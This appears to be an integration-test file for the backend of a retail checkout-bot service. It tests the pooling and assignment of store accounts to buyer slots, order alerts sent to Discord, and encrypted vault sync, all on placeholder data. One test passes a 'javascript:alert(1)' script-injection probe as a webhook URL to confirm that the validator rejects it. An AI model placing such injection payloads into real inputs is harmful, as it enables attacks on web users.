  const offerPost = (link, action) => fetch(link.split("?")[0], { method: "POST", body: new URLSearchParams({ t: new URL(link).searchParams.get("t"), action }) });
  const pool = Array.from({ length: 13 }, (_, i) => ({ email: `pool${i + 1}@outlook.com`, password: "Test-Pw-1!" }));
  const head = tgtCsv.split("\r\n")[0];
  const slotRow = (name, email) => `${name},${name.split(" ")[0]},${name.split(" ")[1]},${email},5550100,4242424242424242,07,2029,123,"1 Main St, Apt 2",,Austin,TX,78701,US,${name.split(" ")[0]},${name.split(" ")[1]},1 Main St,,Austin,TX,78701,US`;
  const slotCsv = (rows) => [head, ...rows].join("\r\n");
  const emailsIn = (text) => text.split("\r\n").slice(1).map((l) => l.split(",")[3]);
  const accounts = async () => (await (await admin("/admin/accounts")).json());
  await test("two licenses for these tests", async () => { ginaKey = await newKey("gina"); bobKey = await newKey("bob"); });
  await test("sending accounts needs a license, a store and email:password pairs", async () => {
    assert.equal((await slots("/accounts/offer", null, { store: "target", accounts: pool })).status, 401);
    for (const body of [{ store: "", accounts: pool }, { store: "Target!", accounts: pool }, { store: "target", accounts: [] }, { store: "target" },
      { store: "target", accounts: [{ email: "nope", password: "x" }] }, { store: "target", accounts: [{ email: "a@b.co", password: "" }] },
      { store: "target", accounts: [{ email: "a@b.co", password: "line\nbreak" }] }])
      assert.equal((await slots("/accounts/offer", ginaKey, body)).status, 400, JSON.stringify(body).slice(0, 70));
  });
  await test("sent accounts wait for the owner: the channel gets the count and a review link, never the accounts", async () => {
    const before = webhookPosts.length;
    const r = await (await slots("/accounts/offer", ginaKey, { store: "target", storeName: "Target", name: "Owner", accounts: [...pool, { ...pool[0], email: "POOL1@outlook.com" }] })).json();
    assert.deepEqual(r, { status: "pending", count: 13 }, "a repeated email counts once");
    await new Promise((ok) => setTimeout(ok, 400));
    assert.equal(webhookPosts.length, before + 1);
    const m = webhookPosts.at(-1).content;
    assert.match(m, /Add 13 Target accounts to your list for Use Assigned Account\?/); assert.match(m, /Sent by \*\*Owner\*\* · @gina/);
    assert.doesNotMatch(m, /pool1@|Test-Pw-1/, "no emails or passwords in the channel");
    reviewLink = offerLink(m); assert.ok(reviewLink, m);
    const html = await (await fetch(reviewLink)).text();
    assert.match(html, /pool1@outlook\.com/); assert.doesNotMatch(html, /Test-Pw-1/, "the review page shows emails, never passwords");
    assert.equal((await fetch(reviewLink.replace(/t=[^&]+/, "t=wrong"))).status, 404);
  });
  await test("until the owner adds them, those slots wait for an account, and the CSV goes as sent", async () => {
    const files = [{ store: "Target", storeKey: "target", kind: "profiles", text: slotCsv([slotRow("Ann One", "ann@example.com")]), assigned: 1 }];
    const r = await (await slots("/submissions", ginaKey, { files, name: "Gina", slots: 1, batch: "asg0" + rid(), stores: [{ name: "Target", n: 1, seller: 1 }] })).json();
    assert.deepEqual(r.accounts, { Target: { asked: 1, got: 0 } });
    const m = webhookPosts.at(-1);
    assert.match(m.content, /\nTarget 1 \(1 needs an account\)\n/); assert.match(m.content, /Profiles that need an account come last\.$/);
    assert.deepEqual(m.files.map((f) => asShown(f.text)), [csvRows(files[0].text)], "no logins file, the CSV as sent");
  });
  await test("adding them from the review link puts them on the list", async () => {
    assert.match(await (await offerPost(reviewLink, "add")).text(), /Added 13 to your list\./);
    await new Promise((ok) => setTimeout(ok, 300));
    const d = await accounts();
    assert.deepEqual(d.stores, [{ store: "target", total: 13, free: 13, sent: 0 }]); assert.equal(d.limit, 10);
    assert.match(webhookEdits.at(-1).content, /Added 13 Target accounts to your list/);
    assert.match(await (await offerPost(reviewLink, "refuse")).text(), /Added 13 to your list/, "decided: stays added");
    assert.equal(d.offers[0].status, "added"); assert.equal(d.offers[0].accounts, undefined, "the offer no longer holds them");
  });
  let first = [];
  await test("each slot on Use Assigned Account gets its own account: email in its row, email:password in the logins, same order", async () => {
    const files = [
      { store: "Target", storeKey: "target", kind: "profiles", text: slotCsv([slotRow("Kim Lee", "kim@example.com"), slotRow("Ann One", "ann@example.com"), slotRow("Bo Two", "bo@example.com"), slotRow("Cy Three", "cy@example.com")]), assigned: 2 },
      { store: "Target", kind: "logins", text: "kim.target@example.com:pa:ss" },
      { store: "Walmart", storeKey: "walmart", kind: "profiles", text: slotCsv([slotRow("Dee Four", "dee@example.com")]), assigned: 1 }];
    const r = await (await slots("/submissions", ginaKey, { files, name: "Gina", slots: 5, batch: "asg1" + rid(),
      stores: [{ name: "Target", n: 4, seller: 2 }, { name: "Walmart", n: 1, seller: 1 }] })).json();
    assert.deepEqual(r.accounts, { Target: { asked: 2, got: 2 }, Walmart: { asked: 1, got: 0 } });
    const m = webhookPosts.at(-1);
    assert.match(m.content, /\nTarget 4 \(2 assigned accounts\) · Walmart 1 \(1 needs an account\)\n/);
    const [csvF, logF, wmF] = m.files;
    const em = emailsIn(csvF.text);
    assert.equal(em[0], "kim@example.com"); assert.equal(em[3], "cy@example.com", "other rows as sent");
    assert.ok(/^pool\d+@outlook\.com$/.test(em[1]) && /^pool\d+@outlook\.com$/.test(em[2]) && em[1] !== em[2], em);
    assert.deepEqual(asShown(csvF.text)[2].map((v) => v === em[1] ? "ann@example.com" : v), csvRows(slotRow("Ann One", "ann@example.com"))[0], "quoted cells come through");
    assert.equal(logF.text, `kim.target@example.com:pa:ss\r\n${em[1]}:Test-Pw-1!\r\n${em[2]}:Test-Pw-1!`);
    assert.deepEqual(asShown(wmF.text), csvRows(files[2].text), "no Walmart list: as sent");
    first = [em[1], em[2]];
    const d = await accounts();
    assert.deepEqual(d.stores, [{ store: "target", total: 13, free: 11, sent: 2 }]);
    assert.deepEqual(d.given.map((a) => [a.email, a.key_last4, a.profile, a.store_name]).sort(), [[em[1], ginaKey.slice(-4), "Ann One", "Target"], [em[2], ginaKey.slice(-4), "Bo Two", "Target"]].sort());
  });
  await test("a store with no logins file gets one for its accounts", async () => {
    const files = [{ store: "Target", storeKey: "target", kind: "profiles", text: slotCsv([slotRow("Eve Five", "eve@example.com")]), assigned: 1 }];
    const r = await (await slots("/submissions", ginaKey, { files, name: "Gina", slots: 1, batch: "asg2" + rid(), stores: [{ name: "Target", n: 1, seller: 1 }] })).json();
    assert.deepEqual(r.accounts, { Target: { asked: 1, got: 1 } });
    const m = webhookPosts.at(-1), e = emailsIn(m.files[0].text)[0];
    assert.deepEqual(m.files.map((f) => f.name.replace(/^orbit-slots-\d{4}-\d\d-\d\d-\d{4}-/, "")), ["Gina-target.csv", "Gina-target-logins.txt"]);
    assert.equal(m.files[1].text, `${e}:Test-Pw-1!`); assert.ok(!first.includes(e), "never one given out before");
    assert.doesNotMatch(m.content, /need an account/);
  });
  await test("a post that fails puts its accounts back; sending again picks again", async () => {
    const files = [{ store: "Target", storeKey: "target", kind: "profiles", text: slotCsv([slotRow("Fay Six", "fay@example.com")]), assigned: 1 }];
    const batch = "asg3" + rid(), before = (await accounts()).stores[0].free;
    webhookFail.push(500);
    assert.equal((await slots("/submissions", ginaKey, { files, name: "Gina", slots: 1, batch, stores: [{ name: "Target", n: 1, seller: 1 }] })).status, 502);
    assert.equal((await accounts()).stores[0].free, before, "back on the list");
    assert.equal((await slots("/submissions", ginaKey, { files, name: "Gina", slots: 1, batch, stores: [{ name: "Target", n: 1, seller: 1 }] })).status, 200);
    assert.equal((await accounts()).stores[0].free, before - 1);
  });
  await test("if part of a batch went out, its accounts stay with it and sending again posts the same ones", async () => {
    const files = [{ store: "Target", storeKey: "target", kind: "profiles", text: slotCsv([slotRow("Gus Seven", "gus@example.com")]), assigned: 1 }];
    for (let i = 0; i < 5; i++) files.push({ store: "Shop " + i, kind: "profiles", text: tgtCsv }, { store: "Shop " + i, kind: "logins", text: `c${i}@example.com:pw` });
    const batch = "asg4" + rid(), before = webhookPosts.length;
    webhookFail.push(0, 500);
    assert.equal((await slots("/submissions", ginaKey, { files, name: "Gina", slots: 6, batch })).status, 502);
    const sentFirst = emailsIn(webhookPosts[before].files[0].text)[0];
    assert.match(sentFirst, /^pool\d+@outlook\.com$/);
    assert.equal((await slots("/submissions", ginaKey, { files, name: "Gina", slots: 6, batch })).status, 200);
    assert.equal(emailsIn(webhookPosts.at(-2).files[0].text)[0], sentFirst, "the same account");
  });
  await test("a license gets 10 accounts in all; the rest of its slots wait for the owner", async () => {
    const held = (await accounts()).given.filter((a) => a.key_last4 === ginaKey.slice(-4)).length;
    assert.equal(held, 5);
    const rows = Array.from({ length: 6 }, (_, i) => slotRow(`Hal H${i}`, `hal${i}@example.com`));
    const files = [{ store: "Target", storeKey: "target", kind: "profiles", text: slotCsv(rows), assigned: 6 }];
    const r = await (await slots("/submissions", ginaKey, { files, name: "Gina", slots: 6, batch: "asg5" + rid(), stores: [{ name: "Target", n: 6, seller: 6 }] })).json();
    assert.deepEqual(r.accounts, { Target: { asked: 6, got: 5 } });
    const m = webhookPosts.at(-2), em = emailsIn(m.files[0].text);
    assert.match(webhookPosts.at(-1).content, /^⚠️ \*\*Only 3 Target accounts left\*\* on your list for Use Assigned Account\. Send more from FAFO/, "down to ACCOUNTS_LOW_AT (3 here): the owner is told");
    assert.match(m.content, /\nTarget 6 \(5 assigned accounts, 1 needs an account\)\n/);
    assert.equal(em[5], "hal5@example.com", "the last one keeps its own email");
    assert.equal(m.files[1].text.split("\r\n").length, 5, "five login lines, for the first five rows");
  });
  await test("the list running out: the rest wait for an account", async () => {
    assert.equal((await accounts()).stores[0].free, 3);
    const rows = Array.from({ length: 4 }, (_, i) => slotRow(`Ida I${i}`, `ida${i}@example.com`));
    const files = [{ store: "Target", storeKey: "target", kind: "profiles", text: slotCsv(rows), assigned: 4 }];
    const r = await (await slots("/submissions", bobKey, { files, name: "Bob", slots: 4, batch: "asg6" + rid(), stores: [{ name: "Target", n: 4, seller: 4 }] })).json();
    assert.deepEqual(r.accounts, { Target: { asked: 4, got: 3 } });
    assert.equal((await accounts()).stores[0].free, 0);
    assert.match(webhookPosts.at(-1).content, /^🚫 \*\*No Target accounts left\*\*/, "and told again when it runs out");
    assert.match(webhookPosts.at(-2).content, /^📦 /, "not told it's low a second time");
    const all = (await accounts()).given.map((a) => a.email);
    assert.equal(new Set(all).size, all.length, "no account given twice"); assert.equal(all.length, 13);
  });
  await test("pulling a slot tells the owner which account it had", async () => {
    const before = webhookPosts.length;
    const r = await (await pull(ginaKey, { keyId: "CSV", name: "Gina", slots: [{ store: "Target", profile: "Ann One", email: "Assigned account", card: "Visa 4242" }, { store: "Target", profile: "Nobody", email: "Assigned account" }] })).json();
    assert.equal(r.forwarded, true);
    const m = webhookPosts[before].content;
    assert.ok(m.includes(`Target · Ann One · ${first[0]} \\(assigned account\\) · Visa 4242`), m);
    assert.match(m, /Target · Nobody · Assigned account/);
    assert.doesNotMatch(m, /Test-Pw-1/);
  });
  await test("the owner can free an account, or all of a license's, and take one off the list", async () => {
    assert.equal((await admin("/admin/accounts/free", {})).status, 400);
    assert.deepEqual(await (await admin("/admin/accounts/free", { email: first[0].toUpperCase() })).json(), { ok: true, changed: 1 });
    assert.equal((await accounts()).stores[0].free, 1);
    assert.deepEqual(await (await admin("/admin/accounts/free", { key: bobKey })).json(), { ok: true, changed: 3 });
    assert.deepEqual(await (await admin("/admin/accounts/remove", { email: first[0] })).json(), { ok: true, changed: 1 });
    assert.deepEqual((await accounts()).stores, [{ store: "target", total: 12, free: 3, sent: 9 }]);
    assert.equal((await fetch(BASE + "/admin/accounts")).status, 401);
  });
  await test("apps before 1.9.58 (no assigned count) are posted as before", async () => {
    const files = [{ store: "Target", kind: "profiles", text: slotCsv([slotRow("Jo Old", "jo@example.com")]) }];
    const r = await (await slots("/submissions", bobKey, { files, name: "Bob", slots: 1, batch: "asg7" + rid(), stores: [{ name: "Target", n: 1, seller: 1 }] })).json();
    assert.equal(r.accounts, undefined);
    const m = webhookPosts.at(-1);
    assert.match(m.content, /\nTarget 1 \(1 needs an account\)\n/); assert.deepEqual(m.files.map((f) => asShown(f.text)), [csvRows(files[0].text)]);
  });
  await test("an offer nobody decided on expires, and its accounts are dropped", async () => {
    await slots("/accounts/offer", ginaKey, { store: "nike", storeName: "Nike", accounts: [{ email: "n1@outlook.com", password: "x1" }] });
    await new Promise((ok) => setTimeout(ok, 400));
    const link = offerLink(webhookPosts.at(-1).content);
    await new Promise((ok) => setTimeout(ok, 8200));   // ACCOUNT_OFFER_TTL_MS is 8000 here
    const html = await (await offerPost(link, "add")).text();
    assert.match(html, /Expired before it was added/); assert.doesNotMatch(html, /n1@outlook\.com/);
    assert.ok(!(await accounts()).stores.some((x) => x.store === "nike"), "nothing added");
    assert.equal((await accounts()).offers.find((o) => o.store === "nike").status, "expired");
  });
  await test("once accounts are freed, running out is told again", async () => {
    assert.equal((await accounts()).stores[0].free, 3);
    const rows = Array.from({ length: 3 }, (_, i) => slotRow(`Kay K${i}`, `kay${i}@example.com`));
    const before = webhookPosts.length;
    const r = await (await slots("/submissions", bobKey, { files: [{ store: "Target", storeKey: "target", kind: "profiles", text: slotCsv(rows), assigned: 3 }], name: "Bob", slots: 3, batch: "asg8" + rid(), stores: [{ name: "Target", n: 3, seller: 3 }] })).json();
    assert.deepEqual(r.accounts, { Target: { asked: 3, got: 3 } });
    const after = webhookPosts.slice(before).map((m) => m.content.slice(0, 2));
    assert.deepEqual(after, ["📦", "🚫"], "the batch, then one message that it ran out (not a second one that it's low)");
  });
  await test("refusing sent accounts adds nothing", async () => {
    await slots("/accounts/offer", ginaKey, { store: "walmart", storeName: "Walmart", accounts: [{ email: "w1@outlook.com", password: "x1" }] });
    await new Promise((ok) => setTimeout(ok, 400));
    const link = offerLink(webhookPosts.at(-1).content);
    assert.match(await (await offerPost(link, "refuse")).text(), /Refused\. Nothing was added\./);
    assert.ok(!(await accounts()).stores.some((x) => x.store === "walmart"));
  });
  await test("CSV batches count toward 30 an hour per license", async () => {
    let sent = 0, limited = false;
    for (let i = 0; i < 40 && !limited; i++){
      const st = (await slots("/submissions", frankKey, { csv, slots: 1 })).status;
      if (st === 429) limited = true; else { assert.equal(st, 200); sent++; }
    }
    assert.ok(limited, "hit the limit");
    const d = await (await admin("/admin/submissions")).json();
    assert.equal(d.submissions.filter((x) => x.key_last4 === frankKey.slice(-4) && Date.now() - x.created_at < 3600e3).length, 30);
  });

  console.log("\nOrder alerts (app 1.9.69+)");
  // Frank's Orbit is the owner's here; Gina and Bob were given accounts above.
  const getAuth = (path, key) => fetch(BASE + path, { headers: { authorization: "Bearer " + key }, cache: "no-store" });
  const putAuth = (path, key, body) => fetch(BASE + path, { method: "PUT", headers: { authorization: "Bearer " + key, "content-type": "application/json" }, body: JSON.stringify(body) });
  const reviewIn = (content) => (content.match(/\((http[^)]+\/alerts\/review\/[^)]+)\)/) || [])[1];
  const today = new Date().toISOString().slice(0, 10);
  let ginaAcct, bobAcct, firstAlert;
  const orderEvent = (o) => ({ account: ginaAcct.email.toUpperCase(), store: "target", storeName: "Target", orderNo: "ord-1001", item: "Pokémon 151 Booster Bundle", qty: "2", total: "$59.98", stage: "placed", at: today, ...o });
  await test("only the allowed sender sends order alerts or sees the accounts given out", async () => {
    const given = (await accounts()).given;
    ginaAcct = given.find((a) => a.key_last4 === ginaKey.slice(-4)); bobAcct = given.find((a) => a.key_last4 === bobKey.slice(-4));
    assert.ok(ginaAcct && bobAcct, "accounts given out above");
    assert.equal((await slots("/alerts", frankKey, { events: [orderEvent()] })).status, 403);
    assert.equal((await getAuth("/alerts/accounts", frankKey)).status, 403);
    assert.equal((await slots("/alerts", null, { events: [orderEvent()] })).status, 401);
    assert.deepEqual(await (await getAuth("/alerts/sender", frankKey)).json(), { status: "none", canAsk: true });
  });
  let senderLink;
  await test("asking posts a review link to the channel; it waits for the owner", async () => {
    assert.deepEqual(await (await slots("/alerts/sender", frankKey, { name: "Owner" })).json(), { status: "pending" });
    await new Promise((ok) => setTimeout(ok, 400));
    const m = webhookPosts.at(-1).content;
    assert.match(m, /Let this FAFO send order alerts to buyers\?/); assert.match(m, /\*\*Owner\*\* · @frank · license …/);
    senderLink = reviewIn(m); assert.ok(senderLink, m);
    assert.equal((await (await getAuth("/alerts/sender", frankKey)).json()).status, "pending");
    assert.match(await (await fetch(senderLink)).text(), /Only allow it if you turned it on/);
    assert.equal((await fetch(senderLink.replace(/t=[^&]+/, "t=wrong"))).status, 404);
  });
  await test("allowing it makes that license the sender, and the channel message says so", async () => {
    assert.match(await (await offerPost(senderLink, "allow")).text(), /Allowed\. Orders on the accounts you assign now reach the buyers who have them\./);
    await new Promise((ok) => setTimeout(ok, 300));
    assert.match(webhookEdits.at(-1).content, /Sends order alerts to buyers/);
    assert.equal((await (await getAuth("/alerts/sender", frankKey)).json()).status, "allowed");
    assert.match(await (await offerPost(senderLink, "refuse")).text(), /Sends order alerts to buyers/, "decided: stays allowed");
    const acc = (await (await getAuth("/alerts/accounts", frankKey)).json()).accounts;
    assert.ok(acc.some((a) => a.email === ginaAcct.email && a.store === "target") && acc.some((a) => a.email === bobAcct.email), "the accounts given out");
    assert.ok(acc.every((a) => Object.keys(a).sort().join() === "email,store"), "just the email and store, never passwords");
    assert.equal((await getAuth("/alerts/accounts", ginaKey)).status, 403);
  });
  await test("an order on a given-out account reaches that buyer, without the account", async () => {
    const r = await (await slots("/alerts", frankKey, { events: [
      orderEvent(), orderEvent({ account: "nobody@example.com" }), orderEvent({ store: "walmart" }), orderEvent({ at: "2020-01-01", orderNo: "OLD-1" }), orderEvent({ stage: "lost" })] })).json();
    assert.deepEqual(r, { ok: true, sent: 1, already: 0, unknown: 4 }, "not given out, another store, from before it was given out, or not a step");
    const got = await (await getAuth("/alerts", ginaKey)).json();
    assert.equal(got.alerts.length, 1);
    firstAlert = got.alerts[0];
    const { id, oid, createdAt, ...rest } = firstAlert;
    assert.deepEqual(rest, { store: "target", storeName: "Target", profile: ginaAcct.profile, orderNo: "ORD-1001", item: "Pokémon 151 Booster Bundle", qty: "2", total: "$59.98", stage: "placed", at: today });
    assert.ok(id && oid && createdAt > 0);
    assert.doesNotMatch(JSON.stringify(got), new RegExp(ginaAcct.email.replace(/[.+]/g, "\\$&"), "i"), "never the account");
    assert.equal((await (await getAuth("/alerts", bobKey)).json()).alerts.length, 0, "nothing for anyone else");
    assert.equal((await getAuth("/alerts", null)).status, 401);
  });
  await test("the same step isn't sent twice; the next one is, under the same order", async () => {
    assert.deepEqual(await (await slots("/alerts", frankKey, { events: [orderEvent()] })).json(), { ok: true, sent: 0, already: 1, unknown: 0 });
    assert.deepEqual(await (await slots("/alerts", frankKey, { events: [orderEvent({ stage: "shipped" })] })).json(), { ok: true, sent: 1, already: 0, unknown: 0 });
    const since = await (await getAuth("/alerts?since=" + firstAlert.createdAt, ginaKey)).json();
    assert.deepEqual(since.alerts.map((a) => [a.stage, a.oid]), [["shipped", firstAlert.oid]]);
    assert.equal((await slots("/alerts", frankKey, { events: [] })).status, 400);
    assert.equal((await slots("/alerts", frankKey, { events: Array.from({ length: 201 }, () => orderEvent()) })).status, 400);
  });
  await test("a buyer's own Discord webhook is checked with a test post, then gets their alerts", async () => {
    const hook = `http://127.0.0.1:${DISCORD_PORT}/buyerhook/123456789/tok_gina_abcdefghijklmnopqrstuvwxyz`;
    assert.deepEqual(await (await getAuth("/alerts/webhook", ginaKey)).json(), { set: false });
    for (const url of ["https://example.com/hook", "https://discord.com/api/webhooks/abc/def", "javascript:alert(1)"])
      assert.equal((await putAuth("/alerts/webhook", ginaKey, { url })).status, 400, url);
    const dead = await putAuth("/alerts/webhook", ginaKey, { url: hook.replace("/buyerhook/", "/buyerhook/dead/") });
    assert.equal(dead.status, 400); assert.match((await dead.json()).error, /Discord answered 404\. Check the webhook link\./);
    assert.deepEqual(await (await putAuth("/alerts/webhook", ginaKey, { url: hook })).json(), { set: true });
    assert.equal(buyerHookPosts.at(-1).content, "✅ FAFO will post your order alerts here.");
    assert.equal((await (await getAuth("/alerts/webhook", ginaKey)).json()).set, true);
    const before = buyerHookPosts.length;
    await slots("/alerts", frankKey, { events: [orderEvent({ stage: "delivered" }), orderEvent({ account: bobAcct.email, orderNo: "BOB-7" })] });
    await new Promise((ok) => setTimeout(ok, 500));
    const posted = buyerHookPosts.slice(before);
    assert.equal(posted.length, 1, "Gina's alert only: Bob has no webhook");
    assert.equal(posted[0].content, `🏠 **Delivered** · Target\n${ginaAcct.profile} · Pokémon 151 Booster Bundle ×2 · $59.98\n-# Order #ORD-1001 · ${today}`);
    assert.deepEqual(posted[0].allowed_mentions, { parse: [] });
    assert.equal((await (await getAuth("/alerts", bobKey)).json()).alerts[0].orderNo, "BOB-7");
  });
  await test("removing the webhook stops the posts; setting one again right away waits a moment", async () => {
    const hook = `http://127.0.0.1:${DISCORD_PORT}/buyerhook/123456789/tok_gina_abcdefghijklmnopqrstuvwxyz`;
    assert.equal((await putAuth("/alerts/webhook", ginaKey, { url: hook })).status, 429, "one change every 5 seconds");
    assert.deepEqual(await (await putAuth("/alerts/webhook", ginaKey, { url: "" })).json(), { set: false });
    const before = buyerHookPosts.length;
    await slots("/alerts", frankKey, { events: [orderEvent({ orderNo: "ORD-2002" })] });
    await new Promise((ok) => setTimeout(ok, 400));
    assert.equal(buyerHookPosts.length, before);
    assert.equal((await (await getAuth("/alerts", ginaKey)).json()).alerts.length, 4, "still kept for the app");
  });
  await test("allowing another license replaces the sender; refusing one leaves it out", async () => {
    await slots("/alerts/sender", bobKey, { name: "Second PC" });
    await new Promise((ok) => setTimeout(ok, 400));
    await offerPost(reviewIn(webhookPosts.at(-1).content), "allow");
    await new Promise((ok) => setTimeout(ok, 300));
    assert.equal((await slots("/alerts", frankKey, { events: [orderEvent({ orderNo: "ORD-3003" })] })).status, 403, "the first one no longer sends");
    assert.equal((await (await getAuth("/alerts/sender", frankKey)).json()).status, "none");
    assert.ok(webhookEdits.some((e) => /No longer sends order alerts/.test(e.content)), "its channel message says so");
    await slots("/alerts/sender", ginaKey, {});
    await new Promise((ok) => setTimeout(ok, 400));
    assert.match(await (await offerPost(reviewIn(webhookPosts.at(-1).content), "refuse")).text(), /Refused\. This FAFO won&#39;t send order alerts\./);
    assert.equal((await (await getAuth("/alerts/sender", ginaKey)).json()).status, "refused");
    assert.equal((await slots("/alerts", ginaKey, { events: [orderEvent()] })).status, 403);
    assert.equal((await (await getAuth("/alerts/sender", bobKey)).json()).status, "allowed");
  });
  await test("admin lists who sends alerts and how many each buyer got, never what they say", async () => {
    const d = await (await admin("/admin/alerts")).json();
    assert.deepEqual(d.senders.map((s) => s.status).sort(), ["allowed", "refused", "replaced"]);
    const g = d.buyers.find((b) => b.username === "gina");
    assert.equal(g.alerts, 4); assert.equal(g.discordWebhook, false);
    assert.doesNotMatch(JSON.stringify(d), /ORD-1001|Booster|review_token/);
  });

  console.log("\nWeb version and sync: vault storage");
  await startWorker("vault", APPROVAL_PORT + 2, ["REQUIRE_APPROVAL=", "REQUIRED_GUILD_ID=", "MIN_ACCOUNT_AGE_DAYS=0", "VAULT_LOCK_MS=3000", "VAULT_MIN_GAP_MS=300"]);
  const [V1, V2] = VAULT_KEYS;
  const b64 = (n) => Buffer.from(crypto.getRandomValues(new Uint8Array(n))).toString("base64");
  const tok = () => Buffer.from(crypto.getRandomValues(new Uint8Array(32))).toString("base64url");
  // A record shaped like the app's: a big random "ciphertext" stands in for the sealed vault.
  const sealed = (salt, ctBytes = 2000, iter = 600000) => ({ format: "orbit-sync", v: 1, z: "gzip", kdf: "PBKDF2-SHA256", iter, salt, iv: b64(12), ct: Buffer.from(crypto.getRandomValues(new Uint8Array(Math.min(ctBytes, 65536)))).toString("base64").repeat(Math.ceil(ctBytes / 65536)), savedAt: new Date().toISOString() });
  const vault = (path, key, { method = "GET", auth, newAuth, record, salt, iter = 600000, raw } = {}) => fetch(BASE + path, { method,
    headers: { ...(key ? { authorization: "Bearer " + key } : {}), ...(auth ? { "x-vault-auth": auth } : {}), ...(newAuth ? { "x-vault-new-auth": newAuth } : {}),
      ...(record || raw ? { "content-type": "application/json", "x-vault-salt": salt || (record && record.salt) || "", "x-vault-iter": String(iter) } : {}) },
    body: raw != null ? raw : record ? JSON.stringify(record) : undefined });
  const wait = (ms) => new Promise((ok) => setTimeout(ok, ms));
  const salt1 = b64(16), token1 = tok();
  let rec1, created1;
  await test("no vault yet: info says so, and a bad or missing license is refused", async () => {
    assert.deepEqual(await (await vault("/vault/info", V1)).json(), { exists: false });
    assert.equal((await vault("/vault/info", "PVLT-NOPE-NOPE-NOPE-NOPE")).status, 401);
    assert.equal((await vault("/vault/info")).status, 401);
    assert.equal((await vault("/vault", V1, { auth: token1 })).status, 404);
  });
  await test("the first save creates it (revision 1), and info gives what a new device needs", async () => {
    rec1 = sealed(salt1);
    const made = await (await vault("/vault?base=0&device=Desktop%20app", V1, { method: "PUT", auth: token1, record: rec1 })).json();
    assert.equal(made.rev, 1); assert.ok(Math.abs(Date.now() - made.created) < 60000, "created says when (the vault's id)");
    created1 = made.created;
    const info = await (await vault("/vault/info", V1.toLowerCase())).json();
    assert.equal(info.exists, true); assert.equal(info.rev, 1); assert.equal(info.created, created1); assert.equal(info.salt, salt1); assert.equal(info.iter, 600000);
    assert.equal(info.device, "Desktop app"); assert.equal(info.size, JSON.stringify(rec1).length); assert.ok(Date.now() - info.updatedAt < 60000);
  });
  await test("reading it back takes the token, and returns exactly what was sent", async () => {
    const r = await (await vault("/vault", V1, { auth: token1 })).json();
    assert.equal(r.rev, 1); assert.equal(r.created, created1); assert.equal(r.device, "Desktop app"); assert.deepEqual(r.record, rec1);
    assert.deepEqual(await (await vault("/vault?have=1", V1, { auth: token1 })).json(), { rev: 1, created: created1, same: true });
    assert.equal((await vault("/vault", V1)).status, 403, "no token");
    assert.equal((await vault("/vault", V1, { auth: tok() })).status, 403, "wrong token");
    assert.equal((await vault("/vault", V2, { auth: token1 })).status, 404, "another license has its own (none yet)");
  });
  await test("a save names the revision it started from; a stale one gets 409 with the current revision", async () => {
    await wait(350);
    const rec2 = sealed(salt1);
    assert.deepEqual(await (await vault(`/vault?base=1&vid=${created1}&device=Web`, V1, { method: "PUT", auth: token1, record: rec2 })).json(), { rev: 2, created: created1 });
    const stale = await vault("/vault?base=1&device=Desktop%20app", V1, { method: "PUT", auth: token1, record: sealed(salt1) });
    assert.equal(stale.status, 409); assert.deepEqual(await stale.json(), { error: "changed on another device", rev: 2, created: created1 });
    const again = await vault("/vault?base=0", V1, { method: "PUT", auth: token1, record: sealed(salt1) });
    assert.equal(again.status, 409, "creating again isn't allowed once it exists");
    const r = await (await vault("/vault?have=1", V1, { auth: token1 })).json();
    assert.equal(r.rev, 2); assert.deepEqual(r.record, rec2); assert.equal(r.device, "Web");
  });
  await test("saves closer than the minimum gap are turned away", async () => {
    await wait(350);
    assert.equal((await vault("/vault?base=2", V1, { method: "PUT", auth: token1, record: sealed(salt1) })).status, 200);
    assert.equal((await vault("/vault?base=3", V1, { method: "PUT", auth: token1, record: sealed(salt1) })).status, 429);
  });
  await test("a save that names another vault (one deleted and made again) gets 409, even on the same revision", async () => {
    await wait(350);
    const r = await vault(`/vault?base=3&vid=${created1 - 1}`, V1, { method: "PUT", auth: token1, record: sealed(salt1) });
    assert.equal(r.status, 409); assert.deepEqual(await r.json(), { error: "changed on another device", rev: 3, created: created1 });
  });
  await test("two devices saving at once from the same revision: one wins, the other gets 409", async () => {
    await wait(350);
    const [a, b] = await Promise.all([1, 2].map(() => vault("/vault?base=3", V1, { method: "PUT", auth: token1, record: sealed(salt1, 300000) })));
    assert.deepEqual([a.status, b.status].sort(), [200, 409]);
    const info = await (await vault("/vault/info", V1)).json();
    assert.equal(info.rev, 4);
    const r = await (await vault("/vault", V1, { auth: token1 })).json();
    assert.equal(r.rev, 4); assert.ok(r.record.ct.length > 300000, "the winner's record is whole");
  });
  await test("a vault of several megabytes goes in chunks and comes back whole; over 8 million characters is refused", async () => {
    await wait(350);
    const big = sealed(salt1, 3_000_000);
    assert.deepEqual(await (await vault("/vault?base=4", V1, { method: "PUT", auth: token1, record: big })).json(), { rev: 5, created: created1 });
    const r = await (await vault("/vault", V1, { auth: token1 })).json();
    assert.equal(r.rev, 5); assert.equal(r.record.ct, big.ct);
    await wait(350);
    const huge = sealed(salt1, 6_200_000);
    assert.equal((await vault("/vault?base=5", V1, { method: "PUT", auth: token1, record: huge })).status, 413);
  });
  await test("only a sealed record sealed with the salt it names is taken", async () => {
    await wait(350);
    assert.equal((await vault("/vault?base=5", V1, { method: "PUT", auth: token1, raw: '{"hello":"world"}', salt: salt1 })).status, 400);
    assert.equal((await vault("/vault?base=5", V1, { method: "PUT", auth: token1, record: sealed(b64(16)), salt: salt1 })).status, 400, "salt header doesn't match the record");
    assert.equal((await vault("/vault?base=5", V1, { method: "PUT", auth: "short", record: sealed(salt1) })).status, 400);
    assert.equal((await vault("/vault?base=x", V1, { method: "PUT", auth: token1, record: sealed(salt1) })).status, 400);
  });
  const salt2 = b64(16), token2 = tok();
  await test("a new password: the record on a new salt needs the new token, then only the new token works", async () => {
    await wait(350);
    assert.equal((await vault("/vault?base=5", V1, { method: "PUT", auth: token1, record: sealed(salt2) })).status, 400, "no new token");
    assert.deepEqual(await (await vault("/vault?base=5", V1, { method: "PUT", auth: token1, newAuth: token2, record: sealed(salt2) })).json(), { rev: 6, created: created1 });
    const old = await vault("/vault", V1, { auth: token1 });
    assert.equal(old.status, 403); assert.equal((await old.json()).error, "password changed", "the old password is recognized as the old one");
    assert.equal((await (await vault("/vault", V1, { auth: token2 })).json()).rev, 6);
    assert.equal((await (await vault("/vault/info", V1)).json()).salt, salt2);
  });
  await test("a device still on the previous password never locks the vault, however often it tries", async () => {
    for (let i = 0; i < 12; i++) assert.equal((await vault("/vault", V1, { auth: token1 })).status, 403);
    assert.equal((await vault("/vault", V1, { auth: token2 })).status, 200);
  });
